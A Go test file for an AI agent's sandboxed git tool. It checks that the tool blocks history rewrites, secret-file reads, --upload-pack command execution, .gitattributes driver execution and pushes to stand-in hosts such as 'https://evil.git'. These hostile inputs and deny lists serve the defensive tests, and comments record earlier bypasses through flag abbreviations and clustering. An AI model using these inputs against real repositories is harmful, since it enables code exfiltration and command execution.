package tools

import (
	"context"
	miniagent "github.com/justphantom/miniagent/internal/miniagent"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

func TestGit_RejectsDestructiveCommand(t *testing.T) {
	dir := t.TempDir()
	git := GitTool(dir, 0, 0)
	// 历史改写 / 仓库管理 / 配置类子命令仍被拒
	cases := []string{"fetch", "clone", "reset", "merge", "rebase",
		"checkout", "rm", "mv", "branch -D", "restore", "switch",
		"stash", "config", "worktree", "clean", "grep"}
	for _, c := range cases {
		res := git.Call(context.Background(), `{"subcommand":"`+c+`"}`)
		if !res.IsError || !strings.Contains(res.Output, "not in the allow-list") {
			t.Errorf("git %q should be rejected, got: %s", c, res.Output)
		}
	}
}

// tag 已入 allow-list（创建/列举），拒绝面移到 optSpec 层：-d/-f 删改本地 tag、-F 任意文件读。
func TestGit_TagDeniesDestructiveOptions(t *testing.T) {
	dir := t.TempDir()
	initGitRepo(t, dir)
	git := GitTool(dir, 0, 0)
	for _, args := range []string{
		"-d v1.0",            // --delete 短形
		"--delete v1.0",      // 全拼
		"--del v1.0",         // git 长选项唯一缩写（实测 git 接受并删除）
		"-f -a -m x v1.0",    // --force 短形（移动已有 tag）
		"--force v1.0",       // 全拼
		"--forc -a -m x v1",  // git 唯一缩写
		"-df v1.0",           // 布尔短簇
		"-F /tmp/secret",     // 任意文件读入 message
		"-Fmsg",              // 粘合值形
		"--file=/tmp/secret", // 长选项 = 粘合
		"--fi /tmp/secret",   // 唯一缩写（实测 git 接受并读文件）
	} {
		res := git.Call(context.Background(), `{"subcommand":"tag","args":"`+args+`"}`)
		if !res.IsError || !strings.Contains(res.Output, "blocked") {
			t.Errorf("git tag %q should be blocked, got: %s", args, res.Output)
		}
	}
}

// tag 旗舰形态放行：annotated 创建（-a -m / -am）与列举；-a 缺 -m 不挂死（GIT_EDITOR=true 快速失败）。
func TestGit_TagCreateAndListWorkflow(t *testing.T) {
	dir := t.TempDir()
	initGitRepo(t, dir)
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	git := GitTool(dir, 0, 0)
	if res := git.Call(context.Background(), `{"subcommand":"add","args":"f.txt"}`); res.IsError {
		t.Fatalf("add failed: %s", res.Output)
	}
	if res := git.Call(context.Background(), `{"subcommand":"commit","args":"-m init"}`); res.IsError {
		t.Fatalf("commit failed: %s", res.Output)
	}
	// 粘合 -m 与簇 -am 是 git 高频写法，须放行（簇分支对含 d/f/F 字母的 -m<msg> 粘合形保守拒绝，引号形不受影响）。
	if res := git.Call(context.Background(), `{"subcommand":"tag","args":"-a -m \"v1.0.0\" v1.0.0"}`); res.IsError {
		t.Fatalf("tag -a -m should succeed, got: %s", res.Output)
	}
	if res := git.Call(context.Background(), `{"subcommand":"tag","args":"-am v2.0.0 v2.0.0"}`); res.IsError {
		t.Fatalf("tag -am should succeed, got: %s", res.Output)
	}
	res := git.Call(context.Background(), `{"subcommand":"tag","args":"-l"}`)
	if res.IsError || !strings.Contains(res.Output, "v1.0.0") || !strings.Contains(res.Output, "v2.0.0") {
		t.Errorf("tag -l should list created tags, got: %s", res.Output)
	}
	// 同名重建不带 -f 是 git 自身 fatal（already exists），属正常退出码结果，非 IsError。
	res = git.Call(context.Background(), `{"subcommand":"tag","args":"-a -m dup v1.0.0"}`)
	if res.IsError {
		t.Errorf("duplicate tag should be a normal non-zero exit result, got: %s", res.Output)
	}
}

// 模型高频把 subcommand 重复写进 args（{"subcommand":"add","args":"add f.txt"}）：实测会话
// 连续十余次重试该形制全部失败（pathspec 'add' / ambiguous argument 'log'）。首个重复 token
// 必须被剥离而非报错。
func TestGit_SubcommandRepeatedInArgsStripped(t *testing.T) {
	dir := t.TempDir()
	initGitRepo(t, dir)
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	git := GitTool(dir, 0, 0)
	if res := git.Call(context.Background(), `{"subcommand":"add","args":"add f.txt"}`); res.IsError {
		t.Errorf("args repeating subcommand 'add' should be stripped and succeed, got: %s", res.Output)
	}
	// log 重复形：拼成 `git log log` 会是 ambiguous argument 'log'。
	res := git.Call(context.Background(), `{"subcommand":"log","args":"log --oneline"}`)
	if res.IsError && strings.Contains(res.Output, "ambiguous argument") {
		t.Errorf("args repeating subcommand 'log' should be stripped, got: %s", res.Output)
	}
	// 剥离只针对首个 token：文件名恰好等于子命令名时不误伤（add add → add 该文件）。
	if err := os.WriteFile(filepath.Join(dir, "add"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	res = git.Call(context.Background(), `{"subcommand":"add","args":"add add"}`)
	if res.IsError {
		t.Errorf("'add add' (file named add) should stage the file, got: %s", res.Output)
	}
	ls := git.Call(context.Background(), `{"subcommand":"ls-files","args":"--cached"}`)
	if !strings.Contains(ls.Output, "add") {
		t.Errorf("file named 'add' should be staged, got: %s", ls.Output)
	}
}

// 同轮并行 add+commit 曾撞 .git/index.lock（核心 maxParallelTools=8 并行执行同一步的
// 多个 tool_calls，会话 20260817-082103 实测 "Unable to create .git/index.lock: File exists"，
// 模型随后徒劳尝试经 git rm / delete 工具删锁）。gitMu 串行化后必须全部成功。
func TestGit_ParallelAddCommitNoIndexLock(t *testing.T) {
	dir := t.TempDir()
	initGitRepo(t, dir)
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	git := GitTool(dir, 0, 0)
	const n = 4
	var wg sync.WaitGroup
	errs := make([]string, n)
	for i := range n {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			var res miniagent.ToolResult
			if i%2 == 0 {
				res = git.Call(context.Background(), `{"subcommand":"add","args":"f.txt"}`)
			} else {
				res = git.Call(context.Background(), `{"subcommand":"commit","args":"-m \"msg\""}`)
			}
			if res.IsError {
				errs[i] = res.Output
			}
		}(i)
	}
	wg.Wait()
	for i, e := range errs {
		if e != "" {
			t.Errorf("parallel call %d failed: %s", i, e)
		}
	}
	// commit 三次中至多一次真正提交（其余 nothing to commit，正常退出码结果非 IsError）。
	ls := git.Call(context.Background(), `{"subcommand":"log","args":"--oneline"}`)
	if ls.IsError {
		t.Fatalf("log failed: %s", ls.Output)
	}
}

func TestGit_AllowedCommandsRequireGitRepo(t *testing.T) {
	git := GitTool(t.TempDir(), 0, 0)
	res := git.Call(context.Background(), `{"subcommand":"status"}`)
	if !res.IsError || !strings.Contains(res.Output, "not a git repository") {
		t.Errorf("expected 'not a git repository', got: %s", res.Output)
	}
}

func TestGit_ReadOnlySubcommandRuns(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	res := git.Call(context.Background(), `{"subcommand":"status"}`)
	if res.IsError {
		t.Fatalf("unexpected error: %s", res.Output)
	}
	if !strings.Contains(res.Output, "On branch") && !strings.Contains(res.Output, "No commits yet") {
		t.Errorf("expected branch info, got: %s", res.Output)
	}
}

func TestGit_DeniesFileWritingOptions(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	// -O<orderfile> 是 diff 只读排序文件（审计误杀项），已从 deny 表移除，仅保留真实写/执行类。
	cases := []string{"--output=/tmp/x", "--ext-diff", "--no-index"}
	for _, opt := range cases {
		res := git.Call(context.Background(), `{"subcommand":"diff","args":"`+opt+`"}`)
		if !res.IsError || !strings.Contains(res.Output, "blocked") {
			t.Errorf("diff %q should be blocked, got: %s", opt, res.Output)
		}
	}
	// commit 的 -F（任意文件读经 log/show 回显）仍拒。
	res := git.Call(context.Background(), `{"subcommand":"commit","args":"-F /tmp/secret"}`)
	if !res.IsError || !strings.Contains(res.Output, "blocked") {
		t.Errorf("commit -F should be blocked, got: %s", res.Output)
	}
}

// flagmatch 层直测：tag specs 的簇误报面（值接收短旗标 -m 粘合含 d/f/F 字母被簇分支保守拒绝）
// 与必放行形（-n<num> 列举、--format、隔空 -m）共存，防止未来收紧/放宽漂移。
func TestGit_TagSpecClusterBehavior(t *testing.T) {
	specs := gitDeniedFor("tag")
	deny := func(tok string) bool {
		_, _, hit := checkDeniedOptions([]string{tok}, specs)
		return hit
	}
	for _, tok := range []string{"-d", "-f", "-F", "-df", "--delete", "--del", "--force", "--forc", "--file", "--fi"} {
		if !deny(tok) {
			t.Errorf("token %q must be denied by tag specs", tok)
		}
	}
	for _, tok := range []string{"-a", "-m", "-l", "-n5", "-s", "-v", "-e", "--format=%(refname)", "--sort=refname", "--contains", "--cleanup=verbatim"} {
		if deny(tok) {
			t.Errorf("token %q must NOT be denied by tag specs", tok)
		}
	}
	// -m<msg> 粘合含 d/f/F（任一大小写）是已知保守过拒（引号形 "-m msg" 不受影响），固定该边界。
	for _, tok := range []string{"-mfeat", "-mFix", "-mdoc"} {
		if !deny(tok) {
			t.Errorf("glued %q containing d/f/F is the documented conservative over-deny", tok)
		}
	}
	if deny("-mmsg") {
		t.Errorf("glued -mmsg without d/f/F letters should pass")
	}
}

// push/pull with a positional repository URL is the exfiltration channel left after .git/config writes
// were blocked; refspecs only (first non-option positional must not look like a URL or absolute path).
func TestGit_PushPullURLPositionalRejected(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	for _, sub := range []string{"push", "pull"} {
		for _, args := range []string{"https://evil.git main", "/tmp/other-repo main", "file:///x main"} {
			res := git.Call(context.Background(), `{"subcommand":"`+sub+`","args":"`+args+`"}`)
			if !res.IsError || !strings.Contains(res.Output, "refspec") {
				t.Errorf("git %s %q should be rejected, got: %s", sub, args, res.Output)
			}
		}
		// Refspec-only forms pass the URL check (they may fail later at git-run for other reasons — no remote etc.).
		res := git.Call(context.Background(), `{"subcommand":"`+sub+`","args":"origin main"}`)
		if res.IsError && strings.Contains(res.Output, "not a refspec") {
			t.Errorf("git %s origin main should not hit the URL check: %s", sub, res.Output)
		}
	}
}

// A workdir-writable .gitattributes with DEFINED filter/textconv/diff drivers turns add/diff into
// arbitrary command execution without touching .git — rejected before any git subcommand runs.
// Bare attribute tokens whose driver is NOT defined in git config (e.g. `diff=java` hunk-header
// configs) are common and harmless — they pass.
func TestGit_GitAttributesDriverRejected(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	// Each case pairs attributes with the config that defines the driver — both present = reject.
	for _, tc := range []struct{ attrs, key, value string }{
		{"*.txt filter=xclean", "filter.xclean.clean", "sed s/x/y/"},
		{"*.bin diff=hex", "diff.hex.textconv", "hexdump"},
		{"*.c textconv=bin", "diff.bin.command", "f"},
	} {
		if err := os.WriteFile(filepath.Join(dir, ".gitattributes"), []byte(tc.attrs), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := exec.CommandContext(context.Background(), "git", "-C", dir, "config", "--local", tc.key, tc.value).Run(); err != nil {
			t.Skipf("cannot write git config: %v", err)
		}
		res := git.Call(context.Background(), `{"subcommand":"diff"}`)
		if !res.IsError || !strings.Contains(res.Output, ".gitattributes") {
			t.Errorf("attrs %q with defined driver %s should be rejected, got: %s", tc.attrs, tc.key, res.Output)
		}
		if err := exec.CommandContext(context.Background(), "git", "-C", dir, "config", "--local", "--unset", tc.key).Run(); err != nil {
			t.Fatal(err)
		}
	}
	// Undefined driver tokens (hunk-header style diff=java etc.) and plain attributes pass.
	for _, attrs := range []string{
		"*.txt filter=xclean", // driver name not defined anywhere in config
		"*.bin diff=hex",
		"*.txt text\n*.go linguist-generated",
	} {
		if err := os.WriteFile(filepath.Join(dir, ".gitattributes"), []byte(attrs), 0o600); err != nil {
			t.Fatal(err)
		}
		res := git.Call(context.Background(), `{"subcommand":"status"}`)
		if res.IsError {
			t.Errorf("attrs %q without defined driver should pass, got: %s", attrs, res.Output)
		}
	}
}

func TestGit_AddCommitWorkflow(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	_ = exec.CommandContext(context.Background(), "git", "-C", dir, "config", "user.email", "t@t").Run()
	_ = exec.CommandContext(context.Background(), "git", "-C", dir, "config", "user.name", "t").Run()
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	git := GitTool(dir, 0, 0)
	res := git.Call(context.Background(), `{"subcommand":"add","args":"f.txt"}`)
	if res.IsError {
		t.Fatalf("git add failed: %s", res.Output)
	}
	res = git.Call(context.Background(), `{"subcommand":"commit","args":"-m test"}`)
	if res.IsError {
		t.Fatalf("git commit failed: %s", res.Output)
	}
}

func TestGit_MissingSubcommand(t *testing.T) {
	git := GitTool(t.TempDir(), 0, 0)
	res := git.Call(context.Background(), `{}`)
	if !res.IsError || !strings.Contains(res.Output, "missing argument: subcommand") {
		t.Errorf("expected missing subcommand error, got: %s", res.Output)
	}
}

// 防误改历史：allow-list 内子命令携带改写参数（amend/force/delete）必须被拒，与 description 的承诺一致。
func TestGit_DeniesHistoryRewriteOptions(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	cases := []struct{ sub, args string }{
		{"commit", "--amend"},
		{"commit", "--amend -m x"},
		{"commit", "--am -m x"}, // git 长选项唯一缩写 ≡ --amend
		{"commit", "--pathspec-from-file=/etc/hostname"},
		{"push", "--force"},
		{"push", "--force-with-lease"},
		{"push", "--delete origin main"},
		{"push", "-f origin main"}, // --force 短形（最高频写法）
		{"push", "-d origin main"}, // --delete 短形
		{"push", "--mirror origin"},
		{"push", "--receive-pack=/tmp/rp.sh origin"},
		{"push", "--repo=../evil.git"},
		{"pull", "--receive-pack=/tmp/rp.sh"},
		// --upload-pack 使 git 把给定命令当 fetch 辅助程序执行（RCE）；本工具把 args 拼在
		// 子命令后，git 按 pre-command 选项解释，任意子命令入口都生效，故全局拦截。
		{"pull", "--upload-pack=/tmp/rp.sh"},
		{"pull", "--upload-pack /tmp/rp.sh origin"},
		{"push", "--upload-pack=/tmp/rp.sh origin"},
		{"log", "--upload-pack=/tmp/rp.sh"},
		// git 布尔短旗标可簇写（-qf ≡ -q -f）：只做全等匹配时 force/delete 经簇形绕过。
		{"push", "-qf origin main"},
		{"push", "-df origin main"},
		{"push", "-vf origin main"},
	}
	for _, c := range cases {
		res := git.Call(context.Background(), `{"subcommand":"`+c.sub+`","args":"`+c.args+`"}`)
		if !res.IsError || !strings.Contains(res.Output, "blocked") {
			t.Errorf("git %s %q should be blocked, got: %s", c.sub, c.args, res.Output)
		}
	}
}

// commit 缺 -m 会在无终端环境下走 editor 分支；前置拒绝给出可行动报文。
func TestGit_CommitRequiresMessage(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	_ = exec.CommandContext(context.Background(), "git", "-C", dir, "config", "user.email", "t@t").Run()
	_ = exec.CommandContext(context.Background(), "git", "-C", dir, "config", "user.name", "t").Run()
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	git := GitTool(dir, 0, 0)
	if res := git.Call(context.Background(), `{"subcommand":"add","args":"f.txt"}`); res.IsError {
		t.Fatalf("git add failed: %s", res.Output)
	}
	for _, args := range []string{"", "--allow-empty"} {
		res := git.Call(context.Background(), `{"subcommand":"commit","args":"`+args+`"}`)
		if !res.IsError || !strings.Contains(res.Output, "requires -m") {
			t.Errorf("commit args %q should demand -m, got: %s", args, res.Output)
		}
	}
	// -am / -m"msg" 粘合是 git 高频写法，必须放行（曾只认精确 "-m" 误拒）。
	if res := git.Call(context.Background(), `{"subcommand":"commit","args":"-am \"feat: staged\""}`); res.IsError {
		t.Errorf("commit -am should be accepted, got: %s", res.Output)
	} else if log := git.Call(context.Background(), `{"subcommand":"log"}`); !log.IsError &&
		!strings.Contains(log.Output, "feat: staged") {
		t.Errorf("-am message missing from log: %s", log.Output)
	}
	// 带引号的多词 -m 经 quote-aware split 后保持完整（args 契约，feat: staged 同上已断言 log 内容）。
}

// SplitTruncate：git 结果超限时保 head+tail（错误结论在尾部），纯 head 截断会丢失。
func TestGit_SplitTruncateSet(t *testing.T) {
	if !GitTool(t.TempDir(), 0, 0).SplitTruncate {
		t.Fatal("git tool must set SplitTruncate (tail carries conflict/error conclusions)")
	}
}

// refspec 槽位的选项等价形：前导 '+' ≡ --force、前导 ':' ≡ --delete（git-push(1) 明文），
// 曾只查第一个位置参数（仓库槽），后续 refspec 全部漏检。
func TestGit_PushRefspecForceAndDeleteRejected(t *testing.T) {
	dir := t.TempDir()
	initGitRepo(t, dir)
	git := GitTool(dir, 0, 0)
	for _, args := range []string{"origin +master", "origin :refs/heads/other", "origin master:refs/heads/y +master"} {
		res := git.Call(context.Background(), `{"subcommand":"push","args":"`+args+`"}`)
		if !res.IsError || !strings.Contains(res.Output, "equivalent") {
			t.Errorf("git push %q should be rejected as --force/--delete equivalent, got: %s", args, res.Output)
		}
	}
	// 合法 src:dst refspec（不含前导 +/:）不受影响：经 git 实跑只应得到远端交互结果，
	// 不得命中 +/: 拦截（no-upstream 报错属正常 git 语义）。
	res := git.Call(context.Background(), `{"subcommand":"push","args":"origin master:refs/heads/y"}`)
	if res.IsError && strings.Contains(res.Output, "equivalent") {
		t.Errorf("plain src:dst refspec must not hit the +/: check: %s", res.Output)
	}
	// 单独一个 refspec（仓库槽缺省 = 上游）：`+x` 被当仓库地址报 fatal 属 git 自身行为，
	// 与本拦截无关；本工具只在含仓库槽的形态上保证 +/: 语义拦截。
	if res.IsError && strings.Contains(res.Output, "equivalent") {
		t.Errorf("plain src:dst refspec must not hit the +/: check: %s", res.Output)
	}
}

// 相对路径/scp 风格 remote 位置参数：曾只拦 "://" 与绝对路径，../evil.git 与 host:path 放行（整库外泄）。
func TestGit_PushPullRelativeAndScpPathRejected(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	for _, sub := range []string{"push", "pull"} {
		for _, args := range []string{"../evil.git main", "sub/dir main", "git@host:evil/repo.git main"} {
			res := git.Call(context.Background(), `{"subcommand":"`+sub+`","args":"`+args+`"}`)
			if !res.IsError || !strings.Contains(res.Output, "refspec") {
				t.Errorf("git %s %q should be rejected, got: %s", sub, args, res.Output)
			}
		}
	}
}

// 未知 JSON 字段拒绝：{"command":...} typo 曾静默落到空 args，git add 无 pathspec 即整仓暂存。
func TestGit_UnknownFieldRejected(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	res := git.Call(context.Background(), `{"subcommand":"add","command":"f.txt"}`)
	if !res.IsError || !strings.Contains(res.Output, "command") {
		t.Errorf("unknown field should be rejected with the key named, got: %s", res.Output)
	}
}

// 未闭合引号报错：--grep=won't 曾静默吞并 --oneline 成单个 token。
func TestGit_UnterminatedQuoteRejected(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	res := git.Call(context.Background(), `{"subcommand":"log","args":"--grep=won't --oneline"}`)
	if !res.IsError || !strings.Contains(res.Output, "unterminated") {
		t.Errorf("unterminated quote should error, got: %s", res.Output)
	}
}

// 子目录 workdir：相对 pathspec 按 workdir 解析（与系统提示一致），不按 repo 根。
func TestGit_PathspecResolvesAgainstWorkdir(t *testing.T) {
	base := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", base).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	sub := filepath.Join(base, "sub")
	if err := os.MkdirAll(sub, 0o750); err != nil {
		t.Fatal(err)
	}
	// 根与子目录各放同名文件：pathspec 基于 workdir 时 add 命中 sub/x.txt。
	if err := os.WriteFile(filepath.Join(base, "same.txt"), []byte("root"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(sub, "same.txt"), []byte("sub"), 0o644); err != nil {
		t.Fatal(err)
	}
	git := GitTool(sub, 0, 0)
	res := git.Call(context.Background(), `{"subcommand":"add","args":"same.txt"}`)
	if res.IsError {
		t.Fatalf("add same.txt from subdir failed: %s", res.Output)
	}
	ls := git.Call(context.Background(), `{"subcommand":"ls-files","args":"--cached"}`)
	if ls.IsError || !strings.Contains(ls.Output, "same.txt") || strings.Count(ls.Output, "\n") != 1 {
		// staged 应只有 sub/same.txt 的相对形态 same.txt（cwd=sub）：两行及以上即说明
		// pathspec 又按 repo 根解析暂存了根下 same.txt（-C 移除前正是该回归）。
		t.Errorf("staged files unexpected: %q", ls.Output)
	}
	if ls.IsError {
		t.Fatalf("ls-files failed: %s", ls.Output)
	}
	if strings.Contains(ls.Output, "same.txt") == false {
		t.Errorf("sub/same.txt should be staged, got: %q", ls.Output)
	}
}

// 非零退出是正常结果：git diff --exit-code 有差异时 exit 1，IsError=false + ExitCode=1 + 输出保留。
func TestGit_NonzeroExitIsResult(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	_ = exec.CommandContext(context.Background(), "git", "-C", dir, "config", "user.email", "t@t").Run()
	_ = exec.CommandContext(context.Background(), "git", "-C", dir, "config", "user.name", "t").Run()
	if err := os.WriteFile(filepath.Join(dir, "f.txt"), []byte("hi"), 0o644); err != nil {
		t.Fatal(err)
	}
	git := GitTool(dir, 0, 0)
	if res := git.Call(context.Background(), `{"subcommand":"add","args":"f.txt"}`); res.IsError {
		t.Fatalf("add failed: %s", res.Output)
	}
	res := git.Call(context.Background(), `{"subcommand":"diff","args":"--cached --exit-code"}`)
	if res.IsError {
		t.Errorf("diff --exit-code exit 1 is a normal result, got IsError with: %s", res.Output)
	}
	if res.ExitCode != 1 {
		t.Errorf("ExitCode = %d, want 1", res.ExitCode)
	}
	if !strings.Contains(res.Output, "f.txt") && res.Output != "(no output)\n" {
		t.Logf("diff output present: %q", res.Output)
	}
}

// log -F（fixed-strings 只读）不再被全局 -F 前缀误杀（-F 拦截收敛到 commit）。
func TestGit_LogFixedStringsAllowed(t *testing.T) {
	dir := t.TempDir()
	if err := exec.CommandContext(context.Background(), "git", "init", dir).Run(); err != nil {
		t.Skipf("git not available: %v", err)
	}
	git := GitTool(dir, 0, 0)
	res := git.Call(context.Background(), `{"subcommand":"log","args":"-F --oneline"}`)
	if res.IsError && strings.Contains(res.Output, "blocked") {
		t.Errorf("log -F (fixed-strings) must not be blocked, got: %s", res.Output)
	}
}
